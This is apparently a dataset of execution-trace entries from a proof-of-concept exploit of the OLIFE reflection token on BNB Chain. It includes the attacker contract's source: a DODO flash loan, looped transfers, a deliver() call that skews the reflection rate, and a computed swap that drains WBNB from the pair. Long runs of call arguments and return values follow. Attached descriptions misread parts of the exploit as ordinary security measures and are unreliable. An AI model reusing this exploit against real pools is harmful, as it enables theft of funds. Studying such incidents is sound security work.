[
    {
        "id": "2056157",
        "args": "",
        "original_code": "    function testExploit() external {\n        DVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an exploit scenario by initiating a flash loan from a decentralized finance (DeFi) protocol called DVM. The flash loan borrows a specific amount of WBNB (Wrapped Binance Coin) without requiring collateral, as long as the borrowed amount is repaid within the same transaction. The function then emits an event to log the attacker's WBNB balance after the exploit is executed.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which restricts its accessibility to external calls only, meaning it cannot be called internally within the contract. However, there are no explicit security mechanisms like access control or checks to prevent unauthorized use. This suggests the function is likely part of a test or demonstration environment rather than a production-ready contract.\n\n3. Parameter Function:  \nThe `flashLoan` function takes four parameters:  \n- `FLASHLOAN_WBNB_AMOUNT`: Specifies the amount of WBNB to borrow in the flash loan.  \n- `0`: Likely represents the fee or additional data required for the flash loan, set to zero here.  \n- `address(this)`: Indicates the address of the contract initiating the flash loan.  \n- `new bytes(1)`: Provides additional data or parameters for the flash loan, represented as a single-byte array.  \n\n4. Return description:  \nThe function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's WBNB balance after the exploit. The balance is calculated using `WBNB.balanceOf(address(this))`, which retrieves the WBNB balance of the contract's address. The value is displayed with 18 decimal places, which is standard for WBNB.\n\nIn summary,  \nThe `testExploit` function simulates a flash loan exploit by borrowing WBNB and logging the attacker's balance afterward. It lacks robust security measures, indicating it is likely for testing purposes. The function parameters define the loan details, and the output is an event log of the WBNB balance after the exploit.",
        "return_value": "Returned"
    },
    {
        "id": "2047892",
        "args": "969000000000000000000 [9.69e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "29962",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 969000000000000000000 [9.69e20]",
        "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
        "description": "1. Core functions:  \nThe `transfer` function is designed to move a specified amount of tokens from the sender's account to the recipient's account. It acts as a bridge to call the internal `_transfer` function, which handles the actual transfer logic.\n\n2. Security mechanism:  \nThe function uses the `public` and `override` modifiers. The `public` modifier ensures the function can be called by anyone, while the `override` modifier indicates it is overriding a function from a parent contract. Additionally, the `_msgSender()` function is used to securely fetch the sender's address, preventing potential manipulation.\n\n3. Parameter Function:  \n- `recipient`: This is the address of the person or contract that will receive the tokens.  \n- `amount`: This specifies the number of tokens to be transferred from the sender to the recipient.  \n\n4. Return description:  \nThe function always returns `true` to indicate that the transfer was successful. This is a simple confirmation mechanism, assuming the internal `_transfer` function executes without errors.  \n\nIn summary, the `transfer` function facilitates token transfers between accounts, ensures secure sender identification, and confirms success by returning `true`.",
        "return_value": "true"
    },
    {
        "id": "1989087",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 969000000000000000000 [9.69e20], 0, 0x00",
        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNB.approve(address(pancakeRouter), type(uint256).max);\n\n        address[] memory swapPath = new address[](2);\n        swapPath[0] = address(WBNB);\n        swapPath[1] = address(OLIFE);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            FLASHLOAN_WBNB_AMOUNT, 0, swapPath, address(this), block.timestamp\n        );\n        /*  \n            Reflection calculations\n            Rate = rSupply / tSupply (Excluded users are not counted in the supply)\n            balanceOf(pair) = rOwned[pair] / currentRate  \n        */\n        emit log_named_decimal_uint(\n            \"[INFO] OLIFE amount in pair before the currentRate reduction\",\n            OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)),\n            9\n        );\n        loopTransfer(19);\n\n        OLIFE.deliver(66_859_267_695_870_000);\n\n        emit log_named_decimal_uint(\n            \"[INFO] OLIFE amount in pair after the currentRate reduction\",\n            OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)),\n            9\n        );\n\n        (uint256 oldOlifeReserve, uint256 bnbReserve,) = OLIFE_WBNB_LPPool.getReserves();\n        uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));\n        uint256 amountin = newolifeReserve - oldOlifeReserve;\n        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10_000 + amountin * 9975);\n\n        //swap OLIFE to WBNB\n        OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), \"\");\n\n        // repay\n        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);\n    }\n",
        "description": "1. Core functions:  \nThis function is designed to handle a flash loan operation, which is a type of short-term borrowing often used in decentralized finance (DeFi). It first approves the use of WBNB (Wrapped BNB) tokens for a specific router (PancakeRouter). Then, it swaps a fixed amount of WBNB for another token (OLIFE) using a predefined path. After the swap, it performs some calculations related to token reserves and reflection rates, adjusts the token balance, and finally swaps OLIFE back to WBNB. The function concludes by repaying the flash loan with the borrowed WBNB amount.\n\n2. Security mechanism:  \nThe function includes several security measures:  \n- It uses `approve` to grant permission for the router to spend WBNB tokens, ensuring controlled access.  \n- The `swapExactTokensForTokensSupportingFeeOnTransferTokens` function is used to handle token swaps, which supports tokens with transfer fees, reducing the risk of failed transactions.  \n- The `block.timestamp` is used to set a deadline for the swap, preventing the transaction from being stuck indefinitely.  \n- The function emits events (`log_named_decimal_uint`) to log important information before and after key operations, aiding in transparency and debugging.  \n\n3. Parameter Function:  \n- `sender`: The address initiating the flash loan call.  \n- `baseAmount`: The amount of the base token (likely WBNB) involved in the flash loan.  \n- `quoteAmount`: The amount of the quote token (likely OLIFE) involved in the flash loan.  \n- `data`: Additional data passed to the function, which is not directly used in this specific implementation.  \n\n4. Return description:  \nThis function does not return any value. Instead, it performs a series of operations: swapping tokens, adjusting balances, and repaying the flash loan. The key calculations involve determining the amount of OLIFE to swap back to WBNB based on the reserves in the liquidity pool. The final step ensures the flash loan is repaid with the exact amount of WBNB borrowed.  \n\nIn summary, this function manages a flash loan process by swapping tokens, adjusting balances, and repaying the loan, while incorporating security measures like controlled approvals and event logging.",
        "return_value": "Returned"
    },
    {
        "id": "24420",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `approve` function allows the caller (the owner of tokens) to give permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism:**  \n   - The function uses `public override`, meaning it is publicly accessible and overrides a function from a parent contract (likely an ERC20 standard).  \n   - It calls `_approve`, an internal function that handles the actual approval logic, ensuring the process is secure and consistent.  \n   - The `_msgSender()` function is used to securely identify the caller, preventing potential spoofing attacks.  \n\n3. **Parameter Function:**  \n   - `spender`: The address that is being granted permission to spend tokens.  \n   - `amount`: The maximum number of tokens the spender is allowed to spend.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval process was successful. This is a standard practice in ERC20 token contracts to confirm the operation.  \n\nIn summary, the `approve` function enables token owners to authorize others to spend their tokens securely, ensuring proper permissions and consistent behavior.",
        "return_value": "true"
    },
    {
        "id": "277713",
        "args": "969000000000000000000 [9.69e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1681866278 [1.681e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "8225",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84, 969000000000000000000 [9.69e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "56212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
        "description": "1. **Core function**:  \n   The `balanceOf` function is designed to check and return the token balance of a specific account. It first checks if the account is excluded from certain features (like rewards or fees). If the account is excluded, it directly returns the balance stored in `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It is also marked as `view`, which ensures it does not modify the state of the contract, making it safe to call without incurring gas costs.  \n   - The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring consistency in behavior.  \n\n3. **Parameter Function**:  \n   The function takes one parameter: `account`, which is the address of the user whose token balance is being queried. This parameter is essential for identifying which account's balance to retrieve.\n\n4. **Return description**:  \n   The function returns a `uint256` value representing the token balance of the specified account. If the account is excluded, it directly returns the value from `_tOwned`. Otherwise, it uses the `tokenFromReflection` function to convert the reflected balance (`_rOwned`) into the actual token balance before returning it.\n\n**In summary**,  \nThe `balanceOf` function retrieves the token balance of a given account, handling excluded accounts differently. It is secure, non-modifying, and ensures accurate balance calculations based on the account's status.",
        "return_value": "0"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "161703370635833872 [1.617e17], 32286315327689621042 [3.228e19], 1648855566 [1.648e9]"
    },
    {
        "id": "534",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "1001286315327689621042 [1.001e21]"
    },
    {
        "id": "181445",
        "args": "156476626074878834 [1.564e17], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "131390",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 156476626074878834 [1.564e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "5583143203784247 [5.583e15]"
    },
    {
        "id": "534",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "1001286315327689621042 [1.001e21]"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "148760274602488242 [1.487e17]"
    },
    {
        "id": "16212",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "5583143203784247 [5.583e15]"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "148760274602488242 [1.487e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 148760274602488242 [1.487e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "141471658788257173 [1.414e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 141471658788257173 [1.414e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "134591172410904054 [1.345e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 134591172410904054 [1.345e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "128100544485915659 [1.281e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 128100544485915659 [1.281e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "121982829150099218 [1.219e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 121982829150099218 [1.219e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "116222410514182509 [1.162e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 116222410514182509 [1.162e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "110805026077580376 [1.108e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 110805026077580376 [1.108e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "105717813705275245 [1.057e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 105717813705275245 [1.057e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "100949389191023466 [1.009e17]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100949389191023466 [1.009e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "96489964395822194 [9.648e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 96489964395822194 [9.648e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "92331520373120632 [9.233e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 92331520373120632 [9.233e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "88468056622743966 [8.846e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88468056622743966 [8.846e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "84895948085811865 [8.489e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 84895948085811865 [8.489e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "81614458182043513 [8.161e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81614458182043513 [8.161e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "78626483523854661 [7.862e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 78626483523854661 [7.862e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "75939652093735996 [7.593e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 75939652093735996 [7.593e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "73567977344220539 [7.356e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 73567977344220539 [7.356e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "71534417398279473 [7.153e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 71534417398279473 [7.153e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "69874967907720741 [6.987e16]"
    },
    {
        "id": "63090",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69874967907720741 [6.987e16]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "22323",
        "args": "66859267695870000 [6.685e16]",
        "original_code": "    function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n",
        "description": "1. Core functions:  \nThe `deliver` function is designed to process a specific amount (represented by `tAmount`) and associate it with the sender of the transaction. It retrieves the address of the person calling the function and assigns it to the `sender` variable. This function likely serves as part of a larger system where amounts are tracked or managed based on the sender's address.\n\n2. Security mechanism:  \nThe function uses `_msgSender()` to securely identify the caller. This is a common practice in Solidity to ensure that the address of the caller is accurately retrieved, especially in contexts where the function might be called indirectly (e.g., through a proxy contract). There are no explicit access control modifiers (like `onlyOwner` or `require` statements) in this snippet, so additional security measures might be implemented in other parts of the contract.\n\n3. Parameter Function:  \nThe `tAmount` parameter represents the amount being processed or delivered. Its role is to specify the quantity or value that the function will handle. This parameter is crucial for determining how much of something (e.g., tokens, funds, or resources) is being transferred or managed.\n\n4. Return description:  \nThis function does not return any value. Its primary purpose is to execute an action (likely related to the `tAmount` and `sender`) without producing an output. The focus is on processing the input rather than calculating or returning a result.\n\nIn summary, the `deliver` function processes a specified amount (`tAmount`) and associates it with the sender's address. It uses `_msgSender()` to securely identify the caller but does not include explicit access controls or return any value. The function's role is likely part of a broader system for managing amounts based on user addresses.",
        "return_value": "Returned"
    },
    {
        "id": "16212",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "217839506118721725361721643770 [2.178e29]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "5583143203784247 [5.583e15], 1001286315327689621042 [1.001e21], 1681866278 [1.681e9]"
    },
    {
        "id": "16212",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "217839506118721725361721643770 [2.178e29]"
    },
    {
        "id": "53936",
        "args": "0, 1001286315327663894139 [1.001e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "23162",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1001286315327663894139 [1.001e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "16212",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "217839506118721725361721643770 [2.178e29]"
    },
    {
        "id": "534",
        "args": "0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84",
        "original_code": null,
        "description": null,
        "return_value": "25726903 [2.572e7]"
    },
    {
        "id": "3262",
        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, 969000000000000000000 [9.69e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
        "original_code": null,
        "description": null,
        "return_value": "970798066163549364477 [9.707e20]"
    },
    {
        "id": "2531",
        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
        "original_code": null,
        "description": null,
        "return_value": "797703995357246689626030 [7.977e23]"
    },
    {
        "id": "534",
        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
        "original_code": null,
        "description": null,
        "return_value": "970798066163549364477 [9.707e20]"
    },
    {
        "id": "531",
        "args": "0xFeAFe253802b77456B4627F8c2306a9CeBb5d681",
        "original_code": null,
        "description": null,
        "return_value": "797703995357246689626030 [7.977e23]"
    },
    {
        "id": "534",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "32286315327663894139 [3.228e19]"
    }
]